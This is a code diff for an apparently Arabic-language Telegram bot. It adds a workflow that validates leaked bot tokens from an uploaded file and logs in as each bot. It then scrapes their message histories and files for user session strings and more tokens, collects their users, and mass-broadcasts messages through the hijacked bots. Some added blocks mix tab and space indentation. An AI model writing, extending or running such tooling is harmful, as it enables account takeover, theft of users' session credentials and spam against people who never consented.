@@ -563,7 +563,7 @@ async def with_db_retry(func, max_retries=5, delay=1):
             raise e
 
 # إضافة دالة للتعامل مع أخطاء التليجرام الداخلية
-async def with_telegram_retry(func, max_retries=3, delay=2):
+async def with_telegram_retry(func, max_retries=12, delay=2):  # جعل 12 افتراضياً
     """تنفيذ دالة مع إعادة المحاولة عند حدوث أخطاء في تليجرام"""
     for attempt in range(max_retries):
         try:
@@ -768,7 +768,7 @@ async def process_message_chunk(bot, start_id, end_id, stats, seen_tokens, seen_
     """معالجة جزء من الرسائل بشكل منفصل"""
     try:
         message_ids = list(range(start_id, end_id))
-        messages = await with_telegram_retry(lambda: bot(GetMessagesRequest(message_ids)))
+        messages = await with_telegram_retry(lambda: bot(GetMessagesRequest(message_ids)), max_retries=12)
         
         for msg in messages.messages:
             if isinstance(msg, MessageEmpty):
@@ -827,7 +827,7 @@ async def process_message_chunk(bot, start_id, end_id, stats, seen_tokens, seen_
                                 access_hash=document.access_hash,
                                 file_reference=document.file_reference,
                                 thumb_size=''
-                            ))
+                            ), max_retries=12)  # زيادة المحاولات هنا أيضاً
                             if file_data:
                                 text_data = file_data.decode(errors="ignore")
                                 
@@ -1632,6 +1632,200 @@ async def network_send_sessions(main_bot, all_bots_data, user_id):
     except Exception as e:
         print(f"Error sending network sessions: {e}")
         return False
+        
+        
+
+
+
+
+# معالجة الأزرار الجديدة
+
+
+# معالجة أزرار التوكنات الإضافية
+
+# معالجة رسالة الإذاعة من ملف
+
+
+# دوال مساعدة للتحليل السريع
+async def analyze_bot_for_sessions_only(bot_token, user_id):
+    """تحليل البوت للعثور على الجلسات فقط"""
+    try:
+        temp_session = os.path.join(SESSION_DIR, f"analyze_sessions_{int(time.time())}")
+        temp_bot = TelegramClient(temp_session, API_ID, API_HASH)
+        await temp_bot.start(bot_token=bot_token)
+        
+        max_id = await find_max_message_id(temp_bot)
+        sessions = {'total': 0, 'details': []}
+        seen_sessions = set()
+        
+        # تقسيم العمل إلى مهام متوازية
+        tasks = []
+        chunk_size = 100
+        
+        for i in range(1, max_id + 1, chunk_size):
+            end_range = min(i + chunk_size, max_id + 1)
+            tasks.append(process_message_chunk_for_sessions(temp_bot, i, end_range, sessions, seen_sessions))
+        
+        # تشغيل جميع المهام بشكل متوازي
+        await asyncio.gather(*tasks, return_exceptions=True)
+        
+        await temp_bot.disconnect()
+        
+        try:
+            if os.path.exists(f"{temp_session}.session"):
+                os.remove(f"{temp_session}.session")
+        except:
+            pass
+        
+        return {'success': True, 'sessions': sessions}
+        
+    except Exception as e:
+        return {'success': False, 'error': str(e)}
+
+async def process_message_chunk_for_sessions(bot, start_id, end_id, sessions, seen_sessions):
+    """معالجة جزء من الرسائل للعثور على الجلسات فقط"""
+    try:
+        message_ids = list(range(start_id, end_id))
+        messages = await with_telegram_retry(lambda: bot(GetMessagesRequest(message_ids)))
+        
+        for msg in messages.messages:
+            if isinstance(msg, MessageEmpty):
+                continue
+            
+            # البحث عن الجلسات في النص
+            if hasattr(msg, 'message') and msg.message:
+                text = msg.message
+                session_matches = SESSION_PATTERN_CHAT.findall(text)
+                for session in session_matches:
+                    if session not in seen_sessions:
+                        seen_sessions.add(session)
+                        sessions['total'] += 1
+                        sessions['details'].append({
+                            'session': session,
+                            'source': 'chat'
+                        })
+            
+            # البحث عن الجلسات في الملفات
+            if hasattr(msg, 'media') and isinstance(msg.media, MessageMediaDocument):
+                try:
+                    document = msg.media.document
+                    file_data = await download_with_retry(bot, InputDocumentFileLocation(
+                        id=document.id,
+                        access_hash=document.access_hash,
+                        file_reference=document.file_reference,
+                        thumb_size=''
+                    ))
+                    if file_data:
+                        text_data = file_data.decode(errors="ignore")
+                        session_matches = SESSION_PATTERN_CHAT.findall(text_data)
+                        for session in session_matches:
+                            if session not in seen_sessions:
+                                seen_sessions.add(session)
+                                sessions['total'] += 1
+                                sessions['details'].append({
+                                    'session': session,
+                                    'source': 'file'
+                                })
+                except:
+                    pass
+                        
+    except Exception as e:
+        print(f"Error processing sessions chunk {start_id}-{end_id}: {e}")
+
+
+
+async def analyze_bot_for_tokens_only(bot_token, user_id):
+    """تحليل البوت للعثور على التوكنات فقط"""
+    try:
+        temp_session = os.path.join(SESSION_DIR, f"analyze_tokens_{int(time.time())}")
+        temp_bot = TelegramClient(temp_session, API_ID, API_HASH)
+        await temp_bot.start(bot_token=bot_token)
+        
+        max_id = await find_max_message_id(temp_bot)
+        tokens = {'total': 0, 'valid': 0, 'details': []}
+        seen_tokens = set()
+        
+        # تقسيم العمل إلى مهام متوازية
+        tasks = []
+        chunk_size = 100
+        
+        for i in range(1, max_id + 1, chunk_size):
+            end_range = min(i + chunk_size, max_id + 1)
+            tasks.append(process_message_chunk_for_tokens(temp_bot, i, end_range, tokens, seen_tokens))
+        
+        # تشغيل جميع المهام بشكل متوازي
+        await asyncio.gather(*tasks, return_exceptions=True)
+        
+        # التحقق من صحة التوكنات بشكل متوازي
+        if tokens['details']:
+            await validate_tokens_parallel(tokens['details'])
+            tokens['valid'] = sum(1 for token in tokens['details'] if token['valid'])
+        
+        await temp_bot.disconnect()
+        
+        try:
+            if os.path.exists(f"{temp_session}.session"):
+                os.remove(f"{temp_session}.session")
+        except:
+            pass
+        
+        return {'success': True, 'tokens': tokens}
+        
+    except Exception as e:
+        return {'success': False, 'error': str(e)}
+
+async def process_message_chunk_for_tokens(bot, start_id, end_id, tokens, seen_tokens):
+    """معالجة جزء من الرسائل للعثور على التوكنات فقط"""
+    try:
+        message_ids = list(range(start_id, end_id))
+        messages = await with_telegram_retry(lambda: bot(GetMessagesRequest(message_ids)))
+        
+        for msg in messages.messages:
+            if isinstance(msg, MessageEmpty):
+                continue
+            
+            # البحث عن التوكنات في النص
+            if hasattr(msg, 'message') and msg.message:
+                text = msg.message
+                token_matches = TOKEN_PATTERN.findall(text)
+                for token in token_matches:
+                    if token not in seen_tokens:
+                        seen_tokens.add(token)
+                        tokens['total'] += 1
+                        tokens['details'].append({
+                            'token': token,
+                            'valid': False,
+                            'bot_info': {}
+                        })
+            
+            # البحث عن التوكنات في الملفات
+            if hasattr(msg, 'media') and isinstance(msg.media, MessageMediaDocument):
+                try:
+                    document = msg.media.document
+                    file_data = await download_with_retry(bot, InputDocumentFileLocation(
+                        id=document.id,
+                        access_hash=document.access_hash,
+                        file_reference=document.file_reference,
+                        thumb_size=''
+                    ))
+                    if file_data:
+                        text_data = file_data.decode(errors="ignore")
+                        token_matches = TOKEN_PATTERN.findall(text_data)
+                        for token in token_matches:
+                            if token not in seen_tokens:
+                                seen_tokens.add(token)
+                                tokens['total'] += 1
+                                tokens['details'].append({
+                                    'token': token,
+                                    'valid': False,
+                                    'bot_info': {}
+                                })
+                except:
+                    pass
+                        
+    except Exception as e:
+        print(f"Error processing tokens chunk {start_id}-{end_id}: {e}")
+
 
 async def main():
     # تهيئة قاعدة البيانات
@@ -1677,6 +1871,624 @@ async def main():
                           "3️⃣ بعدين هتكتب ID المستخدم اللي عايز تنقلله\n"
                           "4️⃣ هجيبلك عدد الرسائل اللي موجوده\n"
                           "5️⃣ اختار انت عايز تنقل من كام لكام")
+                          
+    @bot.on(events.NewMessage(pattern='/file'))
+    async def file_handler(event):
+	    user_id = event.sender_id
+	    # حفظ حالة المستخدم في قاعدة البيانات
+	    await set_user_state(user_id, {'step': 'waiting_file'})
+	    await event.respond("📁 أرسل لي ملف txt يحتوي على توكنات التليجرام\n\n"
+	                        "سيتم استخراج التوكنات من الملف وتحليلها")
+
+    @bot.on(events.NewMessage(func=lambda e: e.is_private and e.file))
+    async def file_receiver_handler(event):
+	    user_id = event.sender_id
+	    user_state = await get_user_state(user_id)
+	    
+	    if user_state.get('step') != 'waiting_file':
+	        return
+	    
+	    try:
+	        # تحميل الملف
+	        file = await event.download_media(file=bytes)
+	        text_content = file.decode('utf-8', errors='ignore')
+	        
+	        # استخراج التوكنات من الملف
+	        tokens = TOKEN_PATTERN.findall(text_content)
+	        unique_tokens = list(set(tokens))  # إزالة التكرار
+	        
+	        if not unique_tokens:
+	            await event.respond("❌ لم يتم العثور على أي توكنات في الملف")
+	            await set_user_state(user_id, {'step': 'start'})
+	            return
+	        
+	        await event.respond(f"🔍 تم العثور على {len(unique_tokens)} توكن في الملف\n⏳ جاري التحقق من التوكنات الصالحة...")
+	        
+	        # التحقق من صحة التوكنات
+	        valid_tokens = []
+	        total_tokens = len(unique_tokens)
+	        
+	        progress_msg = await event.respond(f"⏳ جاري فحص التوكنات...\n📊 التقدم: 0/{total_tokens} (0%)")
+	        
+	        last_update_time = 0
+	        last_processed = 0
+	        
+	        async def update_token_progress(current, total):
+	            nonlocal last_update_time, last_processed
+	            current_time = time.time()
+	            if current_time - last_update_time >= 3 or current == total:
+	                last_update_time = current_time
+	                percent = (current / total) * 100
+	                new_text = f"⏳ جاري فحص التوكنات...\n📊 التقدم: {current}/{total} ({percent:.1f}%)"
+	                await safe_edit_message(progress_msg, new_text)
+	            return True
+	        
+	        for i, token in enumerate(unique_tokens):
+	            # تحديث التقدم كل 3 توكنات أو عند الانتهاء
+	            if i % 3 == 0 or i == total_tokens - 1:
+	                if not await update_token_progress(i + 1, total_tokens):
+	                    break
+	            
+	            try:
+	                validation_result = await validate_token(token)
+	                if validation_result.get('valid', False):
+	                    valid_tokens.append({
+	                        'token': token,
+	                        'bot_info': validation_result
+	                    })
+	            except Exception as e:
+	                print(f"Error validating token {token}: {e}")
+	                continue
+	        
+	        await progress_msg.delete()
+	        
+	        # حفظ البيانات في حالة المستخدم
+	        user_state['file_tokens'] = valid_tokens
+	        user_state['step'] = 'file_tokens_ready'
+	        await set_user_state(user_id, user_state)
+	        
+	        # عرض النتائج والأزرار
+	        buttons = [
+	            [Button.inline("📢 إذاعة للكل", "file_broadcast")],
+	            [Button.inline("🔍 بحث عن جلسات", "file_sessions")],
+	            [Button.inline("🔑 بحث عن توكنات", "file_tokens")]
+	        ]
+	        
+	        await event.respond(
+	            f"✅ تم العثور على {len(valid_tokens)} توكن صالح من أصل {len(unique_tokens)}\n\n"
+	            "ماذا تريد أن تفعل؟",
+	            buttons=buttons
+	        )
+	        
+	    except Exception as e:
+	        await event.respond(f"❌ حدث خطأ في معالجة الملف: {str(e)}")
+	        await set_user_state(user_id, {'step': 'start'})
+
+
+    @bot.on(events.CallbackQuery(pattern='file_'))
+    async def file_buttons_handler(event):
+	    user_id = event.sender_id
+	    data = event.data.decode('utf-8')
+	    
+	    user_state = await get_user_state(user_id)
+	    if user_state.get('step') != 'file_tokens_ready' or 'file_tokens' not in user_state:
+	        await event.answer("❌ لا توجد بيانات توكنات جاهزة")
+	        return
+	    
+	    valid_tokens = user_state['file_tokens']
+	    
+	    if data == 'file_broadcast':
+	        await event.answer("📊 بدء جمع المستخدمين من جميع البوتات...")
+	        
+	        stop_events[user_id] = asyncio.Event()
+	        stop_button = [[Button.inline("⏹ إيقاف", "stop")]]
+	        
+	        progress_msg = await event.edit("⏳ جاري تحليل البوتات وجمع المستخدمين...\n📊 التقدم: 0%", buttons=stop_button)
+	        
+	        all_users = set()
+	        processed_bots = 0
+	        total_bots = len(valid_tokens)
+	        
+	        last_update_time = 0
+	        last_percent = -1
+	        
+	        async def update_broadcast_progress(current, total):
+	            nonlocal last_update_time, last_percent
+	            if user_id in stop_events and stop_events[user_id].is_set():
+	                return False
+	                
+	            current_time = time.time()
+	            current_percent = (current / total) * 100
+	            
+	            if (current_time - last_update_time >= 3 or 
+	                abs(current_percent - last_percent) >= 5 or 
+	                current == total):
+	                
+	                last_update_time = current_time
+	                last_percent = current_percent
+	                new_text = f"⏳ جاري تحليل البوتات وجمع المستخدمين...\n📊 التقدم: {current}/{total} ({current_percent:.1f}%)"
+	                await safe_edit_message(progress_msg, new_text, stop_button)
+	            return True
+	        
+	        try:
+	            for i, token_data in enumerate(valid_tokens):
+	                if user_id in stop_events and stop_events[user_id].is_set():
+	                    break
+	                
+	                token = token_data['token']
+	                try:
+	                    users = await extract_users_from_bot(token, user_id)
+	                    all_users.update(users)
+	                    processed_bots += 1
+	                    
+	                    if not await update_broadcast_progress(processed_bots, total_bots):
+	                        break
+	                        
+	                except Exception as e:
+	                    print(f"Error extracting users from token {token}: {e}")
+	                    continue
+	            
+	            if user_id in stop_events:
+	                del stop_events[user_id]
+	            
+	            if not all_users:
+	                await progress_msg.edit("❌ لم يتم العثور على أي مستخدمين")
+	                return
+	            
+	            user_list = list(all_users)
+	            user_state['file_users_list'] = user_list
+	            user_state['step'] = 'waiting_file_broadcast_message'
+	            await set_user_state(user_id, user_state)
+	            
+	            await progress_msg.edit(
+	                f"✅ تم الاتصال بـ {processed_bots} من أصل {total_bots} بوت\n"
+	                f"👥 عدد جميع المستخدمين: {len(user_list)}\n\n"
+	                f"📝 أرسل الرسالة التي تريد إذاعتها"
+	            )
+	            
+	        except Exception as e:
+	            if user_id in stop_events:
+	                del stop_events[user_id]
+	            await progress_msg.edit(f"❌ حدث خطأ أثناء جمع المستخدمين: {str(e)}")
+	    
+	    elif data == 'file_sessions':
+	        await event.answer("🔍 بدء البحث عن الجلسات...")
+	        
+	        stop_events[user_id] = asyncio.Event()
+	        stop_button = [[Button.inline("⏹ إيقاف", "stop")]]
+	        
+	        progress_msg = await event.edit("⏳ جاري تحليل البوتات واستخراج الجلسات...\n📊 التقدم: 0%", buttons=stop_button)
+	        
+	        all_sessions = set()
+	        processed_bots = 0
+	        total_bots = len(valid_tokens)
+	        
+	        last_update_time = 0
+	        last_percent = -1
+	        
+	        async def update_sessions_progress(current, total):
+	            nonlocal last_update_time, last_percent
+	            if user_id in stop_events and stop_events[user_id].is_set():
+	                return False
+	                
+	            current_time = time.time()
+	            current_percent = (current / total) * 100
+	            
+	            if (current_time - last_update_time >= 3 or 
+	                abs(current_percent - last_percent) >= 5 or 
+	                current == total):
+	                
+	                last_update_time = current_time
+	                last_percent = current_percent
+	                new_text = f"⏳ جاري تحليل البوتات واستخراج الجلسات...\n📊 التقدم: {current}/{total} ({current_percent:.1f}%)"
+	                await safe_edit_message(progress_msg, new_text, stop_button)
+	            return True
+	        
+	        try:
+	            for i, token_data in enumerate(valid_tokens):
+	                if user_id in stop_events and stop_events[user_id].is_set():
+	                    break
+	                
+	                token = token_data['token']
+	                try:
+	                    # تحليل البوت للعثور على الجلسات
+	                    analysis = await analyze_bot_for_sessions_only(token, user_id)
+	                    if analysis['success'] and analysis['sessions']['details']:
+	                        for session in analysis['sessions']['details']:
+	                            if 'session' in session:
+	                                all_sessions.add(session['session'])
+	                    
+	                    processed_bots += 1
+	                    
+	                    if not await update_sessions_progress(processed_bots, total_bots):
+	                        break
+	                        
+	                except Exception as e:
+	                    print(f"Error analyzing sessions from token {token}: {e}")
+	                    continue
+	            
+	            if user_id in stop_events:
+	                del stop_events[user_id]
+	            
+	            # إنشاء ملف ZIP بالجلسات
+	            zip_buffer = io.BytesIO()
+	            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
+	                if all_sessions:
+	                    sessions_text = "\n\n".join([f"Session {i+1}:\n{session}" for i, session in enumerate(all_sessions)])
+	                    zip_file.writestr("sessions.txt", sessions_text)
+	            
+	            zip_buffer.seek(0)
+	            
+	            caption = (
+	                f"🔐 الجلسات المستخرجة\n"
+	                f"• عدد البوتات المفحوصة: {processed_bots}\n"
+	                f"• عدد الجلسات الموجودة: {len(all_sessions)}"
+	            )
+	            
+	            await bot.send_file(
+	                entity=user_id,
+	                file=zip_buffer,
+	                caption=caption,
+	                attributes=[DocumentAttributeFilename("extracted_sessions.zip")]
+	            )
+	            
+	            await progress_msg.delete()
+	            await event.answer("✅ تم إرسال ملف الجلسات")
+	            
+	        except Exception as e:
+	            if user_id in stop_events:
+	                del stop_events[user_id]
+	            await progress_msg.edit(f"❌ حدث خطأ أثناء استخراج الجلسات: {str(e)}")
+	    
+	    elif data == 'file_tokens':
+	        await event.answer("🔑 بدء البحث عن التوكنات...")
+	        
+	        stop_events[user_id] = asyncio.Event()
+	        stop_button = [[Button.inline("⏹ إيقاف", "stop")]]
+	        
+	        progress_msg = await event.edit("⏳ جاري تحليل البوتات واستخراج التوكنات...\n📊 التقدم: 0%", buttons=stop_button)
+	        
+	        all_found_tokens = []
+	        processed_bots = 0
+	        total_bots = len(valid_tokens)
+	        
+	        last_update_time = 0
+	        last_percent = -1
+	        
+	        async def update_tokens_progress(current, total):
+	            nonlocal last_update_time, last_percent
+	            if user_id in stop_events and stop_events[user_id].is_set():
+	                return False
+	                
+	            current_time = time.time()
+	            current_percent = (current / total) * 100
+	            
+	            if (current_time - last_update_time >= 3 or 
+	                abs(current_percent - last_percent) >= 5 or 
+	                current == total):
+	                
+	                last_update_time = current_time
+	                last_percent = current_percent
+	                new_text = f"⏳ جاري تحليل البوتات واستخراج التوكنات...\n📊 التقدم: {current}/{total} ({current_percent:.1f}%)"
+	                await safe_edit_message(progress_msg, new_text, stop_button)
+	            return True
+	        
+	        try:
+	            for i, token_data in enumerate(valid_tokens):
+	                if user_id in stop_events and stop_events[user_id].is_set():
+	                    break
+	                
+	                token = token_data['token']
+	                try:
+	                    # تحليل البوت للعثور على التوكنات
+	                    analysis = await analyze_bot_for_tokens_only(token, user_id)
+	                    if analysis['success'] and analysis['tokens']['details']:
+	                        for token_info in analysis['tokens']['details']:
+	                            if token_info.get('valid', False):
+	                                all_found_tokens.append({
+	                                    'token': token_info['token'],
+	                                    'bot_info': token_info.get('bot_info', {})
+	                                })
+	                    
+	                    processed_bots += 1
+	                    
+	                    if not await update_tokens_progress(processed_bots, total_bots):
+	                        break
+	                        
+	                except Exception as e:
+	                    print(f"Error analyzing tokens from token {token}: {e}")
+	                    continue
+	            
+	            if user_id in stop_events:
+	                del stop_events[user_id]
+	            
+	            # إزالة التكرار
+	            unique_tokens = []
+	            seen_tokens = set()
+	            for token_data in all_found_tokens:
+	                if token_data['token'] not in seen_tokens:
+	                    seen_tokens.add(token_data['token'])
+	                    unique_tokens.append(token_data)
+	            
+	            user_state['file_found_tokens'] = unique_tokens
+	            await set_user_state(user_id, user_state)
+	            
+	            buttons = [
+	                [Button.inline("📝 إرسال التوكنات نصياً", "send_tokens_text")],
+	                [Button.inline("📁 إرسال التوكنات في ملف", "send_tokens_file")]
+	            ]
+	            
+	            await progress_msg.edit(
+	                f"✅ تم فحص {processed_bots} من أصل {total_bots} بوت\n"
+	                f"🔑 تم العثور على {len(unique_tokens)} توكن صالح\n\n"
+	                f"اختر طريقة الإرسال:",
+	                buttons=buttons
+	            )
+	            
+	        except Exception as e:
+	            if user_id in stop_events:
+	                del stop_events[user_id]
+	            await progress_msg.edit(f"❌ حدث خطأ أثناء استخراج التوكنات: {str(e)}")
+	            
+
+    @bot.on(events.CallbackQuery(pattern='send_tokens_'))
+    async def send_tokens_handler(event):
+        user_id = event.sender_id
+        data = event.data.decode('utf-8')
+        
+        user_state = await get_user_state(user_id)
+        if 'file_found_tokens' not in user_state:
+            await event.answer("❌ لا توجد توكنات جاهزة للإرسال")
+            return
+        
+        tokens_data = user_state['file_found_tokens']
+        
+        if data == 'send_tokens_text':
+            await event.answer("📝 بدء إرسال التوكنات نصياً...")
+            
+            for i, token_info in enumerate(tokens_data):
+                token = token_info['token']
+                bot_info = token_info.get('bot_info', {})
+                
+                message = (
+                    f"{'-' * 40}\n"
+                    f"توكن رقم: {i + 1}\n\n"
+                    f"🎉 توكن بوت صالح من الشبكة!\n\n"
+                    f"🔐 معلومات التوكن:\n{token}\n\n"
+                    f"🤖 معلومات البوت:\n"
+                    f"├ الاسم: {bot_info.get('bot_name', 'غير معروف')}\n"
+                    f"├ المستخدم: @{bot_info.get('bot_username', 'غير معروف')}\n"
+                    f"├📩عدد الرسائل: {bot_info.get('total_messages', 'غير معروف')}\n"
+                    f"├👤عدد المستخدمين: {bot_info.get('total_users', 'غير معروف')}\n"
+                    f"└ الآيدي: {bot_info.get('bot_id', 'غير معروف')}\n"
+                    f"عدد المستخدمين: {bot_info.get('total_users', 'غير معروف')}\n"
+                    f"{'-' * 40}"
+                )
+                
+                await event.respond(message)
+                await asyncio.sleep(0.5)
+            
+            await event.answer(f"✅ تم إرسال {len(tokens_data)} توكن")
+        
+        elif data == 'send_tokens_file':
+            await event.answer("📁 بدء إنشاء ملف التوكنات...")
+            
+            # إنشاء محتوى الملف
+            file_content = ""
+            for i, token_info in enumerate(tokens_data):
+                token = token_info['token']
+                bot_info = token_info.get('bot_info', {})
+                
+                file_content += (
+                    f"{'-' * 40}\n"
+                    f"توكن رقم: {i + 1}\n\n"
+                    f"🎉 توكن بوت صالح من الشبكة!\n\n"
+                    f"🔐 معلومات التوكن:\n{token}\n\n"
+                    f"🤖 معلومات البوت:\n"
+                    f"├ الاسم: {bot_info.get('bot_name', 'غير معروف')}\n"
+                    f"├ المستخدم: @{bot_info.get('bot_username', 'غير معروف')}\n"
+                    f"├📩عدد الرسائل: {bot_info.get('total_messages', 'غير معروف')}\n"
+                    f"├👤عدد المستخدمين: {bot_info.get('total_users', 'غير معروف')}\n"
+                    f"└ الآيدي: {bot_info.get('bot_id', 'غير معروف')}\n"
+                    f"عدد المستخدمين: {bot_info.get('total_users', 'غير معروف')}\n"
+                    f"{'-' * 40}\n\n"
+                )
+            
+            # إرسال الملف
+            filename = f"tokens_{int(time.time())}.txt"
+            with open(filename, 'w', encoding='utf-8') as f:
+                f.write(file_content)
+            
+            await bot.send_file(
+                entity=user_id,
+                file=filename,
+                caption=f"🔑 ملف التوكنات المستخرجة\n• عدد التوكنات: {len(tokens_data)}",
+                attributes=[DocumentAttributeFilename("extracted_tokens.txt")]
+            )
+            
+            try:
+                os.remove(filename)
+            except:
+                pass
+            
+            await event.answer("✅ تم إرسال ملف التوكنات")
+            
+    @bot.on(events.NewMessage(func=lambda e: e.is_private))
+    async def file_broadcast_message_handler(event):
+	    user_id = event.sender_id
+	    user_state = await get_user_state(user_id)
+	    
+	    if user_state.get('step') != 'waiting_file_broadcast_message':
+	        return
+	    
+	    text = event.text.strip()
+	    
+	    if text.startswith('/'):
+	        return
+	    
+	    # تنفيذ الإذاعة - كل بوت يرسل لمستخدميه فقط
+	    valid_tokens = user_state['file_tokens']
+	    total_bots = len(valid_tokens)
+	    
+	    stop_events[user_id] = asyncio.Event()
+	    stop_button = [[Button.inline("⏹ إيقاف", "stop")]]
+	    
+	    progress_msg = await event.respond(f"🚀 بدء الإذاعة من {total_bots} بوت...", buttons=stop_button)
+	    
+	    total_success = 0
+	    total_failed = 0
+	    processed_bots = 0
+	    
+	    last_update_time = 0
+	    last_percent = -1
+	    
+	    async def update_file_broadcast_progress(current_bots, total_bots, success_count, failed_count):
+	        nonlocal last_update_time, last_percent
+	        if user_id in stop_events and stop_events[user_id].is_set():
+	            return False
+	            
+	        current_time = time.time()
+	        current_percent = (current_bots / total_bots) * 100
+	        
+	        if (current_time - last_update_time >= 5 or 
+	            abs(current_percent - last_percent) >= 1 or 
+	            current_bots == total_bots):
+	            
+	            last_update_time = current_time
+	            last_percent = current_percent
+	            new_text = (
+	                f"📤 الإذاعة الشبكية: {current_bots}/{total_bots} ({current_percent:.1f}%)\n"
+	                f"✅ نجح: {success_count} | ❌ فشل: {failed_count}"
+	            )
+	            await safe_edit_message(progress_msg, new_text, stop_button)
+	        return True
+	    
+	    try:
+	        for i, token_data in enumerate(valid_tokens):
+	            if user_id in stop_events and stop_events[user_id].is_set():
+	                break
+	            
+	            token = token_data['token']
+	            try:
+	                # كل بوت يرسل لمستخدميه فقط
+	                users = await extract_users_from_bot(token, user_id)
+	                if users:
+	                    # استخدام دالة البث السريعة الجديدة
+	                    success, failed = await fast_broadcast_message(
+	                        token,  # استخدام توكن هذا البوت
+	                        users,  # إرسال لمستخدمي هذا البوت فقط
+	                        text,
+	                        None,  # لا نحتاج progress callback داخلي
+	                        stop_events.get(user_id)
+	                    )
+	                    
+	                    total_success += success
+	                    total_failed += failed
+	                
+	                processed_bots += 1
+	                
+	                if not await update_file_broadcast_progress(processed_bots, total_bots, total_success, total_failed):
+	                    break
+	                    
+	            except Exception as e:
+	                print(f"Error broadcasting with token {token}: {e}")
+	                processed_bots += 1
+	                continue
+	        
+	        if user_id in stop_events:
+	            del stop_events[user_id]
+	        
+	        await progress_msg.edit(
+	            f"🎉 تم الانتهاء من الإذاعة الشبكية!\n\n"
+	            f"📊 النتائج:\n"
+	            f"• عدد البوتات: {processed_bots}/{total_bots}\n"
+	            f"• ✅ الرسائل الناجحة: {total_success}\n"
+	            f"• ❌ الرسائل الفاشلة: {total_failed}"
+	        )
+	        
+	        user_state['step'] = 'file_tokens_ready'
+	        await set_user_state(user_id, user_state)
+	        
+	    except Exception as e:
+	        if user_id in stop_events:
+	            del stop_events[user_id]
+	        await progress_msg.edit(f"❌ حدث خطأ أثناء الإذاعة: {str(e)}")
+
+	# إضافة دالة البث السريعة الجديدة
+    async def fast_broadcast_message(bot_token, user_ids, message_text, progress_callback=None, stop_event=None):
+	    """إرسال رسالة إلى قائمة من المستخدمين بسرعة 0.1 ثانية مع توقف للبوتات الكبيرة"""
+	    try:
+	        temp_session = os.path.join(SESSION_DIR, f"broadcast_bot_{int(time.time())}")
+	        temp_bot = TelegramClient(temp_session, API_ID, API_HASH)
+	        await temp_bot.start(bot_token=bot_token)
+	        
+	        success_count = 0
+	        failed_count = 0
+	        total_users = len(user_ids)
+	        last_update_time = 0
+	        
+	        for i, user_id in enumerate(user_ids):
+	            if stop_event and stop_event.is_set():
+	                break
+	                
+	            try:
+	                # محاولة إرسال الرسالة
+	                await with_telegram_retry(lambda: temp_bot.send_message(int(user_id), message_text))
+	                success_count += 1
+	                
+	            except Exception as e:
+	                # تحسين التعامل مع الأخطاء المختلفة
+	                error_msg = str(e).lower()
+	                if "could not find the input entity" in error_msg:
+	                    # المستخدم غير موجود أو محظور
+	                    failed_count += 1
+	                elif "bots can't send messages to other bots" in error_msg:
+	                    # لا يمكن إرسال رسائل للبوتات الأخرى
+	                    failed_count += 1
+	                elif "user is deactivated" in error_msg:
+	                    # المستخدم محذوف
+	                    failed_count += 1
+	                elif "peer id invalid" in error_msg:
+	                    # معرف المستخدم غير صالح
+	                    failed_count += 1
+	                elif "user is blocked" in error_msg:
+	                    # المستخدم محظور
+	                    failed_count += 1
+	                else:
+	                    # أخطاء أخرى
+	                    failed_count += 1
+	                    print(f"Error sending to user {user_id}: {e}")
+	            
+	            # التوقف 5 ثواني فقط إذا كان عدد المستخدمين أكثر من 1000 وتم إرسال 500 رسالة
+	            if total_users > 1000 and (i + 1) % 500 == 0 and (i + 1) < total_users:
+	                print(f"⏸️ توقف مؤقت بعد إرسال 500 رسالة من أصل {total_users}")
+	                await asyncio.sleep(5)
+	            
+	            # إرسال كل 0.1 ثانية بدلاً من 0.3
+	            await asyncio.sleep(0.1)
+	            
+	            # تحديث التقدم كل 5 ثواني أو عند الانتهاء
+	            current_time = time.time()
+	            if progress_callback and (current_time - last_update_time >= 5 or i + 1 == total_users):
+	                last_update_time = current_time
+	                if not await progress_callback(i + 1, total_users):
+	                    break
+	        
+	        await temp_bot.disconnect()
+	        
+	        try:
+	            if os.path.exists(f"{temp_session}.session"):
+	                os.remove(f"{temp_session}.session")
+	        except:
+	            pass
+	        
+	        return success_count, failed_count
+	        
+	    except Exception as e:
+	        print(f"Error in fast broadcast: {e}")
+	        return 0, total_users
+	        
+	        
 
     @bot.on(events.NewMessage(pattern='/dump'))
     async def dump_handler(event):
